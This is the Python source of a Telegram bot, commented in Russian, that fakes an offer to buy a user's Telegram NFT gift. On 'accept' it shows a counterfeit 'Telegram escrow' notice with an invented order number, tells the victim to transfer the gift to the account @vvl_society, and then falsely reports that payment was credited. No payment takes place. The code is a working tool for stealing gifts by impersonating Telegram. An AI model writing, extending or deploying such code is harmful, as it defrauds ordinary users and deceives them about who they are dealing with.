import asyncio
import logging
import os
import re
import requests
from bs4 import BeautifulSoup
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder

BOT_TOKEN = os.environ.get("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}

# --- Функция парсинга картинки и названия NFT ---
def parse_nft_page(url):
    """Заходит на страницу NFT и вытаскивает картинку и название"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        # Картинка NFT (og:image)
        og_image = soup.find("meta", property="og:image")
        image_url = og_image["content"] if og_image else None

        # Заголовок (og:title)
        og_title = soup.find("meta", property="og:title")
        title = og_title["content"] if og_title else "NFT Подарок"

        # Описание (og:description) - оттуда вытащим модель, фон и т.д.
        og_desc = soup.find("meta", property="og:description")
        description = og_desc["content"] if og_desc else ""

        return {
            "image": image_url,
            "title": title,
            "description": description
        }
    except Exception as e:
        logging.error(f"Ошибка парсинга {url}: {e}")
        return None


# --- Команда /buy ---
@dp.message(Command("buy"))
async def cmd_buy(message: types.Message):
    args = message.text.split()
    
    if len(args) < 4:
        await message.answer("⚠️ Использование: `/buy <ссылка_на_NFT> <сумма> <валюта>`\nПример: `/buy https://t.me/nft/ViceCream-302895 1000 STARS`")
        return

    nft_link = args[1]
    amount = args[2]
    currency = args[3].upper()

    # Сообщение "Загружаю..."
    loading_msg = await message.answer("⏳ Загружаю данные NFT...")

    # Парсим страницу NFT
    nft_data = parse_nft_page(nft_link)

    if not nft_data or not nft_data["image"]:
        await loading_msg.edit_text(
            "⚠️ Не удалось загрузить данные NFT.\n"
            "Проверьте ссылку или попробуйте позже."
        )
        return

    # Формируем название (Vice Cream #302895)
    nft_title = nft_data["title"]
    
    # Если в title нет #номера, попробуем вытащить из ссылки
    if "#" not in nft_title:
        match = re.search(r"-(\d+)$", nft_link)
        if match:
            nft_title = f"Vice Cream #{match.group(1)}"

    # Подпись под картинкой
    caption = (
        f"<b>Telegram\n{nft_title}</b>\n\n"
        f"Пользователь предлагает вам\n"
        f"<b>{amount} {currency}</b> за подарок <b>{nft_title}</b>.\n\n"
        f"Оффер действителен ещё 6 ч. 0 мин."
    )

    # Кнопки
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{message.from_user.id}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{message.from_user.id}")
    )

    # Сохраняем данные сделки
    deal_id = str(message.from_user.id)
    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title
    }

    # Удаляем "Загружаю..." и отправляем фото
    await loading_msg.delete()
    try:
        await message.answer_photo(
            photo=nft_data["image"],
            caption=caption,
            reply_markup=builder.as_markup(),
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"Ошибка отправки фото: {e}")
        await message.answer(
            text=caption,
            reply_markup=builder.as_markup(),
            parse_mode="HTML"
        )


@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    await callback.message.edit_caption(caption="❌ Предложение отклонено")
    await callback.answer()


@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    await callback.answer(
        text="Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )
    await asyncio.sleep(1.5)
    
    deal_id = callback.data.split("_")[1]
    deal = active_deals.get(deal_id)
    if not deal:
        await callback.message.edit_caption(caption="⚠️ Ошибка: данные о сделке утеряны.")
        return

    final_caption = (
        f"<b>NFT Deal</b>\n\n"
        f"Ордер #TG-D721BSTP\n\n"
        f"Покупатель зарезервировал <b>{deal['amount']} {deal['currency']}</b> через эскроу-систему Telegram.\n"
        f"Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @vvl_society\n"
        f"2. Нажмите «Передать NFT» и выберите {deal['title']}\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит {deal['amount']} {deal['currency']} на ваш баланс. Резерв действует 24 часа."
    )

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="Передать NFT", url=deal["link"])
    )
    builder.row(
        InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_{deal_id}")
    )

    # Меняем подпись под фото (edit_caption), а не текст
    try:
        await callback.message.edit_caption(
            caption=final_caption,
            reply_markup=builder.as_markup(),
            parse_mode="HTML"
        )
    except Exception:
        # Если сообщение изначально было без фото (fallback)
        await callback.message.edit_text(
            text=final_caption,
            reply_markup=builder.as_markup(),
            parse_mode="HTML"
        )


@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    await callback.answer("✅ Транзакция подтверждена!", show_alert=True)
    await callback.message.edit_caption(caption="✅ Сделка завершена. Средства зачислены на ваш баланс.")


# --- Веб-сервер для Render ---
async def handle(request):
    return web.Response(text="Bot is alive!")

async def main():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 8080)))
    await site.start()
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())